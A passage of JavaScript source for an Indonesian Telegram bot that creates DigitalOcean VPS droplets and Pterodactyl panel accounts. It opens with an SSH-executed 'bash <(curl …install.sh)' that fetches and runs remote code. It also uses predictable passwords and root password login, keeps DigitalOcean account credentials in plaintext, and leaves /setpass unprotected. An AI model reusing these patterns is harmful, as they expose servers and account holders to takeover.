    const command = 'bash <(curl https://raw.githubusercontent.com/LeXcZxMoDz9/folderr/refs/heads/main/install.sh)';

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        bot.sendMessage(chatId, 'PROSES INSTALL DEPEND DIMULAI MOHON TUNGGU 1-2 MENIT KEDEPAN');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                bot.sendMessage(chatId, '`SUKSES INSTALL DEPEND ADDON/NEBULA`');
                conn.end();
            }).on('data', (data) => {
                stream.write('11\n');
                stream.write('A\n');
                stream.write('Y\n');
                stream.write('Y\n');

                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        bot.sendMessage(chatId, 'Katasandi atau IP tidak valid');
    }).connect(connSettings);

    setTimeout(() => {
        if (isSuccess) {
            bot.sendMessage(chatId, '');
        }
    }, 60000); // 180000 ms = 3 menit
});
bot.onText(/^\/list$/, async msg => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
      if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  try {
    const droplets = await getDO().listDroplets();
    if (!Array.isArray(droplets) || !droplets.length)
      return bot.sendMessage(chatId, '🚫 Tidak ada droplet aktif.\nBuat VPS: /createvps <name>');
    const t = droplets.map(d => `• <b>${d.name}</b> (<code>${d.id}</code>) — ${d.status}`).join('\n');
    bot.sendMessage(chatId, `<b>List VPS:</b>\n\n${t}\n\n<b>Tutorial:</b> /detail (id) untuk info detail & IP, /setpass (id) (password)`, { parse_mode:'HTML' });
  } catch (e) {
    bot.sendMessage(chatId, `❌ ${e.message}`);
  }
});

bot.onText(/^\/detail\s+(\d+)/, async (msg, [, id]) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
      if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  try {
    const d = await getDO().getDroplet(+id);
    const ip = d.networks.v4.find(n => n.type === 'public')?.ip_address || '-';
    const pw = PASSES[id] ? `<code>${PASSES[id]}</code>` : '<i>Belum di-set</i>';
    const specs = [
      `Nama       : <b>${d.name}</b>`,
      `ID         : <code>${d.id}</code>`,
      `Status     : <b>${d.status}</b>`,
      `IPv4       : <code>${ip}</code>`,
      `Password   : ${pw}`,
      `RAM        : <b>${d.memory} MB</b>`,
      `CPU        : <b>${d.vcpus} vCPU</b>`,
      `Disk       : <b>${d.disk} GB</b>`,
      `Region     : <b>${d.region}</b>`,
      `Image      : <b>${d.image.slug}</b>`,
      `Created At : <b>${d.created_at}</b>`
    ].join('\n');
    bot.sendMessage(
      chatId,
      `<b>Detail VPS</b>\n\n${specs}\n\nKelola SSH: /setpass (id) (password)\n<b>Tutorial:</b> /installpanel atau /installtheme setelah isi password`,
      { parse_mode: 'HTML' }
    );
  } catch (e) {
    bot.sendMessage(chatId, '❌ ' + e.message);
  }
});

const userStates = {};
const RAM_CONFIGS = {
  ram1gb:   { size: 's-1vcpu-1gb',      label: '1GB RAM / 1 vCPU',         cpu: '1x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram2gb:   { size: 's-1vcpu-2gb',      label: '2GB RAM / 1 vCPU',         cpu: '1x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram3gb:   { size: 's-1vcpu-3gb',      label: '3GB RAM / 1 vCPU',         cpu: '1x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram4gb2:  { size: 's-2vcpu-4gb',      label: '4GB RAM / 2 vCPU',         cpu: '2x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram4gb4:  { size: 's-4vcpu-4gb',      label: '4GB RAM / 4 vCPU',         cpu: '4x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram8gb2:  { size: 's-2vcpu-8gb',      label: '8GB RAM / 2 vCPU',         cpu: '2x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram8gb4:  { size: 's-4vcpu-8gb',      label: '8GB RAM / 4 vCPU',         cpu: '4x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram16gb4: { size: 's-4vcpu-16gb',     label: '16GB RAM / 4 vCPU',        cpu: '4x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram16gb8: { size: 's-8vcpu-16gb',     label: '16GB RAM / 8 vCPU',        cpu: '8x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram32gb4: { size: 's-4vcpu-32gb',     label: '32GB RAM / 4 vCPU',        cpu: '4x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  ram32gb8: { size: 's-8vcpu-32gb',     label: '32GB RAM / 8 vCPU',        cpu: '8x Shared vCPU (Intel/AMD)', info: 'Standard - Shared vCPU' },
  // AMD Premium Only (Dedicated vCPU, cocok buat performa tinggi)
  ram16gbA4:{ size: 's-4vcpu-16gb-amd', label: '16GB RAM / 4 vCPU (AMD Premium)', cpu: '4x Dedicated vCPU AMD EPYC™ 7601', info: 'Premium AMD, Dedicated' },
  ram16gbA8:{ size: 's-8vcpu-16gb-amd', label: '16GB RAM / 8 vCPU (AMD Premium)', cpu: '8x Dedicated vCPU AMD EPYC™ 7601', info: 'Premium AMD, Dedicated' },
  ram32gbA4:{ size: 's-4vcpu-32gb-amd', label: '32GB RAM / 4 vCPU (AMD Premium)', cpu: '4x Dedicated vCPU AMD EPYC™ 7601', info: 'Premium AMD, Dedicated' },
  ram32gbA8:{ size: 's-8vcpu-32gb-amd', label: '32GB RAM / 8 vCPU (AMD Premium)', cpu: '8x Dedicated vCPU AMD EPYC™ 7601', info: 'Premium AMD, Dedicated' }
};

const REGIONS = {
  nyc1: '🇺🇸 New York 1', nyc3: '🇺🇸 New York 3',
  sfo1: '🇺🇸 San Francisco 1', sfo2: '🇺🇸 San Francisco 2', sfo3: '🇺🇸 San Francisco 3',
  sgp1: '🇸🇬 Singapore 1', fra1: '🇩🇪 Frankfurt 1', lon1: '🇬🇧 London 1', tor1: '🇨🇦 Toronto 1',
  blr1: '🇮🇳 Bangalore 1', ams3: '🇳🇱 Amsterdam 3', syd1: '🇦🇺 Sydney 1', nyc2: '🇺🇸 New York 2', lon2: '🇬🇧 London 2'
};

const OS_IMAGES = [
  'ubuntu-24-04-x64', 'ubuntu-22-04-x64', 'ubuntu-20-04-x64', 'debian-12-x64', 'debian-11-x64',
  'centos-9-x64', 'rockylinux-9-x64', 'alma-9-x64', 'fedora-40-x64', 'freebsd-13-2-x64'
];

const PASS_COUNT_FILE = './otax_pass_count.txt';

function getPassCount(){
  if(!fs.existsSync(PASS_COUNT_FILE)) fs.writeFileSync(PASS_COUNT_FILE,'1');
  return parseInt(fs.readFileSync(PASS_COUNT_FILE,'utf8'))||1;
}
function incrementPassCount(){
  const v = getPassCount()+1;
  fs.writeFileSync(PASS_COUNT_FILE, String(v));
}

const DO_TAG_MAIN = 'otaxbot'
function parseTTLArg(text) {
  const m = /^\/createvps(?:\s+(\d+)([dhwmo]))?$/i.exec(text || '')
  if (!m) return null
  if (!m[1]) return { ttlMs: null, expISO: null }
  const n = parseInt(m[1],10)
  const u = m[2].toLowerCase()
  const mult = u==='m'?60_000: u==='h'?3_600_000: u==='d'?86_400_000: u==='w'?7*86_400_000: u==='o'?30*86_400_000:0
  const ttlMs = n*mult
  const expISO = new Date(Date.now()+ttlMs).toISOString()
  return { ttlMs, expISO }
}
async function sweepExpiredDroplets(notify=true) {
  try {
    const list = await axios.get('https://api.digitalocean.com/v2/droplets?tag_name='+encodeURIComponent(DO_TAG_MAIN),{headers:{Authorization:`Bearer ${TOKENS.list[TOKENS.current]}`}})
    const now = Date.now()
    for (const d of list.data.droplets||[]) {
      const tag = (d.tags||[]).find(t=>t.startsWith('exp:'))
      if (!tag) continue
      const iso = tag.slice(4)
      const expTs = Date.parse(iso)
      if (!isNaN(expTs) && now>=expTs) {
        try {
          await axios.delete(`https://api.digitalocean.com/v2/droplets/${d.id}`,{headers:{Authorization:`Bearer ${TOKENS.list[TOKENS.current]}`}})
          if (notify) await bot.sendMessage(ADMIN_ID,`🗑️ VPS ${d.name} (${d.id}) dihapus otomatis (${iso})`)
        } catch(e) {
          if (notify) await bot.sendMessage(ADMIN_ID,`⚠️ Gagal hapus VPS ${d.name} (${d.id}): ${e.response?.data?.message||e.message}`)
        }
      }
    }
  } catch(e) {
    if (notify) await bot.sendMessage(ADMIN_ID,`⚠️ Sweep gagal: ${e.response?.data?.message||e.message}`)
  }
}
setInterval(()=>sweepExpiredDroplets(false),600000)
setTimeout(()=>sweepExpiredDroplets(false),30000)

bot.onText(/^\/createvps(?:\s+(\d+)([dhwmo]))?$/i,async msg=>{
  const chatId=msg.chat.id
  const userId=msg.from.id
  if(userId!==ADMIN_ID)return bot.sendMessage(chatId,"This command is only available to the owner.")
  const ttlParsed=parseTTLArg(msg.text)
  const ttlMs=ttlParsed?.ttlMs||null
  const expISO=ttlParsed?.expISO||null
  const ramButtons=Object.entries(RAM_CONFIGS).map(([k,v])=>[{text:v.label,callback_data:`ram_${k}`}])
  const ttlLabel=expISO?`⏳ Masa aktif: <code>${expISO}</code>`:'⏳ Masa aktif: <i>tanpa batas</i>'
  await sendBanner(msg,`Silakan pilih <b>RAM VPS</b>:\n${ttlLabel}`)
  await bot.sendMessage(chatId,'👇 <b>Pilih RAM VPS:</b>',{parse_mode:'HTML',reply_markup:{inline_keyboard:ramButtons}})
  userStates[chatId]={step:'pick_ram',ttlMs,expISO}
})

bot.on('callback_query',async q=>{
  const chatId=q.message.chat.id
  const userId=q.from.id
  if(userId!==ADMIN_ID)return bot.answerCallbackQuery(q.id,{text:'This command is only available to the owner.'})
  const data=q.data
  const state=userStates[chatId]||{}
  if(state.step==='pick_ram'&&data.startsWith('ram_')){
    const ramKey=data.slice(4)
    userStates[chatId]={step:'pick_region',ramKey,ttlMs:state.ttlMs,expISO:state.expISO}
    const regionButtons=Object.entries(REGIONS).map(([k,l])=>[{text:l,callback_data:`region_${k}`}])
    await bot.sendMessage(chatId,'Pilih region VPS:',{reply_markup:{inline_keyboard:regionButtons}})
    return bot.answerCallbackQuery(q.id)
  }
  if(state.step==='pick_region'&&data.startsWith('region_')){
    const regionKey=data.slice(7)
    userStates[chatId]={step:'pick_os',ramKey:state.ramKey,regionKey,ttlMs:state.ttlMs,expISO:state.expISO}
    const osButtons=OS_IMAGES.map(os=>[{text:os,callback_data:`os_${os}`}])
    await bot.sendMessage(chatId,'Pilih versi OS:',{reply_markup:{inline_keyboard:osButtons}})
    return bot.answerCallbackQuery(q.id)
  }
  if(state.step==='pick_os'&&data.startsWith('os_')){
    const osImage=data.slice(3)
    userStates[chatId]={step:'pick_hostname',ramKey:state.ramKey,regionKey:state.regionKey,osImage,ttlMs:state.ttlMs,expISO:state.expISO}
    await bot.sendMessage(chatId,'Masukkan hostname VPS (3–30 char, a–z0–9-) :')
    return bot.answerCallbackQuery(q.id)
  }
  bot.answerCallbackQuery(q.id)
})

bot.on('message',async msg=>{
  const chatId=msg.chat.id
  const userId=msg.from.id
  if(userId!==ADMIN_ID)return
  const state=userStates[chatId]
  if(!state||state.step!=='pick_hostname')return
  const hostname=(msg.text||'').trim()
  if(!/^[a-z0-9-]{3,30}$/.test(hostname)||hostname.startsWith('-')||hostname.endsWith('-'))return bot.sendMessage(chatId,'Hostname tidak valid.')
  const{ramKey,regionKey,osImage,expISO}=state
  const ramCfg=RAM_CONFIGS[ramKey]
  delete userStates[chatId]
  await bot.sendMessage(chatId,`Membuat VPS ${ramCfg.label} di ${REGIONS[regionKey]} dengan OS ${osImage}…`)
  const passCount=getPassCount()
  const password=`otax${passCount}${ramCfg.label.replace(/\D/g,'')}gbvps`
  incrementPassCount()
  const tags=[DO_TAG_MAIN]
  if(expISO)tags.push(`exp:${expISO}`)
  const dropletData={name:hostname,region:regionKey,size:ramCfg.size,image:osImage,ssh_keys:null,backups:false,ipv6:true,user_data:`#cloud-config\npassword: ${password}\nchpasswd: { expire: False }\nssh_pwauth: true`,tags}
  try{
    const resp=await axios.post('https://api.digitalocean.com/v2/droplets',dropletData,{headers:{'Content-Type':'application/json','Authorization':`Bearer ${TOKENS.list[TOKENS.current]}`}})
    const dropletId=resp.data.droplet.id
    await bot.sendMessage(chatId,`✅ VPS dibuat (ID: ${dropletId}). Menunggu IP (±60s)…`)
    await new Promise(r=>setTimeout(r,60000))
    const info=await axios.get(`https://api.digitalocean.com/v2/droplets/${dropletId}`,{headers:{Authorization:`Bearer ${TOKENS.list[TOKENS.current]}`}})
    const drop=info.data.droplet
    const ipVps=drop.networks.v4[0]?.ip_address||'-'
    const cpu=drop.vcpus||'-'
    const disk=drop.disk||'-'
    const status=drop.status||'-'
    const created=drop.created_at||'-'
    await bot.sendMessage(chatId,
`━━━━━━━━━━━━━━━━━━━━━━━
<b>✨ 𝙊𝙏𝘼𝙓 𝙑𝙋𝙎 𝘽𝙊𝙏</b> ⚡️
━━━━━━━━━━━━━━━━━━━━━━━
<b>✅ VPS BARU SUKSES DIBUAT!</b>

<b>🆔 ID:</b> <code>${dropletId}</code>
<b>🖥️ Hostname:</b> <code>${hostname}</code>
<b>🌐 IP VPS:</b> <code>${ipVps}</code>
<b>💾 RAM:</b> <code>${ramCfg.label}</code>
<b>🧮 CPU:</b> <code>${cpu} vCPU</code>
<b>🗄️ Disk:</b> <code>${disk} GB</code>
<b>🖥️ OS:</b> <code>${osImage}</code>
<b>📍 Region:</b> <code>${REGIONS[regionKey]}</code>
<b>🟢 Status:</b> <code>${status}</code>
<b>👤 Username:</b> <code>root</code>
<b>🔑 Password:</b> <code>${password}</code>
━━━━━━━━━━━━━━━━━━━━━━━
<b>📅 Dibuat:</b> <code>${created}</code>
<b>🕒 Sekarang:</b> <code>${new Date().toLocaleString('id-ID',{hour12:false})}</code>
━━━━━━━━━━━━━━━━━━━━━━━

<i>Powered by <b>OTAX VPS</b> 🚀 | <a href="https://t.me/otapengenkawin">Support Telegram</a></i>
━━━━━━━━━━━━━━━━━━━━━━━`,{parse_mode:'HTML',disable_web_page_preview:true})
  }catch(err){
    await bot.sendMessage(chatId,`❌ Gagal membuat VPS: ${err.response?.data?.message||err.message}`)
  }
})
bot.onText(/^\/(reboot|poweroff|poweron|delete)\s+(\d+)/, async (msg,[,a,id]) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    try {
        const doapi=getDO();
        if(a==='reboot')await doapi.rebootDroplet(+id);
        else if(a==='poweroff')await doapi.powerOffDroplet(+id);
        else if(a==='poweron')await doapi.powerOnDroplet(+id);
        else await doapi.deleteDroplet(+id);
        bot.sendMessage(chatId, a==='delete'?'🗑️ VPS dihapus!':'✅ Sukses.');
    } catch(e) {
        bot.sendMessage(chatId, '❌ ' + e.message);
    }
});

bot.onText(/^\/rename\s+(\d+)\s+(.+)/, async (msg,[,id,nm]) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    try {
        await getDO().renameDroplet(+id,nm);
        bot.sendMessage(chatId,'✏️ Nama VPS diubah!');
    } catch(e) {
        bot.sendMessage(chatId,'❌ '+e.message);
    }
});

bot.onText(/^\/snapshot\s+(\d+)(?:\s+(\S+))?/, async(msg,[,id,n]) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    try {
        await getDO().snapshotDroplet(+id,n||`snap-${Date.now()}`);
        bot.sendMessage(chatId,'📸 Snapshot sedang diproses');
    } catch(e) {
        bot.sendMessage(chatId,'❌ '+e.message);
    }
});

bot.onText(/^\/resize\s+(\d+)\s+(\S+)/, async(msg,[,id,size]) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    try {
        await getDO().resizeDroplet(+id,size);
        bot.sendMessage(chatId,'🔄 Resize dikirim, VPS harus dalam keadaan off.');
    } catch(e) {
        bot.sendMessage(chatId,'❌ '+e.message);
    }
});

bot.onText(/^\/sisa$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    bot.sendChatAction(chatId, 'typing');
    try {
        const doapi = getDO();
        const [acc, droplets] = await Promise.all([
            doapi.account(),
            doapi.listDroplets()
        ]);
        const dropletLimit = acc.droplet_limit ?? 0;
        const totalDroplets = droplets.length;
        const remainingDroplets = dropletLimit - totalDroplets;
        bot.sendMessage(chatId,
`🟢 <b>INFO LIMIT VPS</b>
━━━━━━━━━━━━━━
🧩 <b>Kuota Akun :</b>  <code>${dropletLimit}</code>
⚙️ <b>VPS Aktif  :</b>  <code>${totalDroplets}</code>
💎 <b>Sisa Slot  :</b>  <code>${remainingDroplets}</code>
━━━━━━━━━━━━━━
${remainingDroplets > 0 ? '✅ Masih bisa create VPS.' : '⚠️ Slot habis, hapus VPS dulu.'}
`, { parse_mode: 'HTML' });
    } catch (error) {
        bot.sendMessage(chatId, `❌ ${error.message}`);
    }
});

bot.onText(/^\/link$/, msg => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    sendBanner(msg,
        `🌐 <b>Login DigitalOcean:</b>\n<a href="https://cloud.digitalocean.com/login">https://cloud.digitalocean.com/login</a>\n\n1. Login akun DO yang kamu beli.\n2. Buka menu <b>API</b> → <b>Generate Token</b> (centang read+write)\n3. Tambahkan ke bot dengan: <code>/addtoken &lt;alias&gt; &lt;token&gt;</code>\n\nBingung? Ketik /help`
    );
});

bot.onText(/^\/addakun\s+(\S+)\s+(\S+)\s+(\S+)/, async (msg, [, gmail, pass, alias]) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    DO_AKUN.push({ email: gmail, password: pass, alias, digunakan: false });
    await saveAkun();
    sendBanner(msg,
        `✅ <b>Akun DigitalOcean tersimpan!</b>\n\n• <b>Email:</b> <code>${gmail}</code>\n• <b>Password:</b> <code>${pass}</code>\n• <b>Alias:</b> <b>${alias}</b>\n\nGunakan alias ini untuk menandai akun saat generate token.\n\n<b>Tutorial:</b>\n1. Login ke <a href="https://cloud.digitalocean.com/login">DigitalOcean</a> pakai email di atas\n2. Buka menu <b>API</b> → Generate Token\n3. Tambahkan ke bot: <code>/addtoken ${alias} &lt;token&gt;</code>\n4. Cek status: <code>/akun</code> / <code>/sisaakun</code>`, { disable_web_page_preview: true }
    );
});

bot.onText(/^\/akun$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    if (!DO_AKUN.length)
        return sendBanner(msg, '📂 <b>Tidak ada akun DO tersimpan.</b>\n\nTambah: <code>/addakun &lt;email&gt; &lt;pass&gt; &lt;alias&gt;</code>');
    const text = DO_AKUN.map(
        (a, i) =>
            `#${i+1}\n<b>Email:</b> <code>${a.email}</code>\n<b>Pass :</b> <code>${a.password}</code>\n<b>Alias:</b> <b>${a.alias}</b>\n<b>Status:</b> ${a.digunakan ? '✅ Terpakai' : '❌ Belum'}\n`
    ).join('\n');
    sendBanner(msg,
        `📋 <b>List Akun DigitalOcean:</b>\n\n${text}\n\n<b>Cara pakai:</b>\n- Salin email & password, login ke <a href="https://cloud.digitalocean.com/login">DigitalOcean</a>\n- Buka menu <b>API</b>, generate token, lalu tambah ke bot dengan <code>/addtoken &lt;alias&gt; &lt;token&gt;</code>`,
        { disable_web_page_preview: true }
    );
});

bot.onText(/^\/sisaakun$/, msg => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    const sisa = DO_AKUN.filter(a => !a.digunakan);
    if (!sisa.length)
        return sendBanner(msg, '✅ <b>Tidak ada akun DO sisa. Semua sudah dipakai!</b>');
    const text = sisa.map(
        (a, i) => `#${i+1}\n<b>Email:</b> <code>${a.email}</code>\n<b>Pass :</b> <code>${a.password}</code>\n<b>Alias:</b> <b>${a.alias}</b>`
    ).join('\n');
    sendBanner(msg,
        `🗂️ <b>Sisa Akun DO Belum Dipakai:</b>\n\n${text}\n\n<b>Tutorial:</b>\n1. Pilih akun di atas, login ke <a href="https://cloud.digitalocean.com/login">DigitalOcean</a> menggunakan email & password tersebut\n2. Masuk menu <b>API</b> → Generate Token\n3. Tambahkan token ke bot: <code>/addtoken &lt;alias&gt; &lt;token&gt;</code>\n4. Setelah dipakai, status akun otomatis berubah "Terpakai"\n\nCek juga: <code>/akun</code> untuk seluruh koleksi email dan <code>/list</code> untuk daftar VPS.`,
        { disable_web_page_preview: true }
    );
});

bot.onText(/^\/tokens$/, msg => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    const txt = listAliases().map(x => x === TOKENS.current ? `• <b>${x}</b> (aktif)` : `• <code>${x}</code>`).join('\n') || 'None';
    bot.sendMessage(chatId, `<b>Daftar Token DigitalOcean:</b>\n${txt}\n\n<b>Tutorial:</b>\n1. Gunakan <code>/addtoken &lt;alias&gt; &lt;token&gt;</code> untuk menambah\n2. Pilih token aktif: <code>/usetoken &lt;alias&gt;</code>\n3. Hapus token: <code>/rmtoken &lt;alias&gt;</code>\n\nToken aktif akan digunakan untuk semua aksi create/list VPS.`, { parse_mode: 'HTML' });
});

bot.onText(/^\/usetoken\s+(\S+)/, async (msg, [, a]) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    if (!TOKENS.list[a]) return bot.sendMessage(chatId, '❌ Alias tak ditemukan');
    TOKENS.current = a;
    await saveTokens();
    bot.sendMessage(chatId, `🛡️ Sekarang token aktif: <b>${a}</b>\n\n<i>Semua perintah VPS seperti create, list, dan install akan pakai akun ini.</i>\n\n<b>Tutorial:</b>\n- Pilih token aktif dulu sebelum /createvps atau /list\n- Lihat semua token: <code>/tokens</code>`, { parse_mode: 'HTML' });
});

bot.onText(/^\/rmtoken\s+(\S+)/, async (msg, [, a]) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
    if (!TOKENS.list[a]) return bot.sendMessage(chatId, '❌ Alias tak ditemukan');
    delete TOKENS.list[a];
    DO_CLIENTS.delete(a);
    if (TOKENS.current === a) TOKENS.current = listAliases()[0] || null;
    await saveTokens();
    bot.sendMessage(chatId, `🗑️ Token <b>${a}</b> dihapus\n\n<b>Tutorial:</b>\n- Hapus jika token DO sudah tidak dipakai atau akun sudah ganti.`, { parse_mode: 'HTML' });
});
bot.onText(/^\/setpass\s+(\d+)\s+(.+)/, async (m, [, id, pw]) => {
    PASSES[id] = pw;
    await savePasses();
    bot.sendMessage(m.chat.id, '🔑 Password tersimpan');
  });
  bot.onText(/\/1gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /1gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "1gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "1024";
  const cpu = "30";
  const disk = "1024";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `Nih Data Panelnya😁
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? "Unlimited" : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? "Unlimited" : server.limits.disk} MB
CPU: ${server.limits.cpu}%`
    );
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

 PANEL DATA ANDA :
×͜× Login : ${domain}
×͜× Username : ${user.username}
×͜× Password : ${password} 
┏━━━━━━━⬣
│• Jangan Ddos Server
│• Wajib tutup domain saat screenshot
┗━━━━━━━━━━━━━━━━━━⬣
𝗖𝗥𝗘𝗔𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 𝗕𝗬 𝗢𝗧𝗔𝗫`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Dikirim Bos Ku Bisa Di Cek Ya!!🔥"
      );
    }
  } else {
    bot.sendMessage(chatId, "Haduh..Gagal Bosku Sabar Ya, Kayaknya ada kesalahan😮‍💨.");
  }
});
// 2gb
bot.onText(/\/2gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
   const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  if (userId !== ADMIN_ID) {
        return bot.sendMessage(chatId, "This command is only available to the owner.");
    }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /2gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "2gb";
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = "2048";
  const cpu = "60";
  const disk = "2048";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}_${u}@buyer.OTAX`;
  const akunlo = "https://files.catbox.moe/587otn.jpg";
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
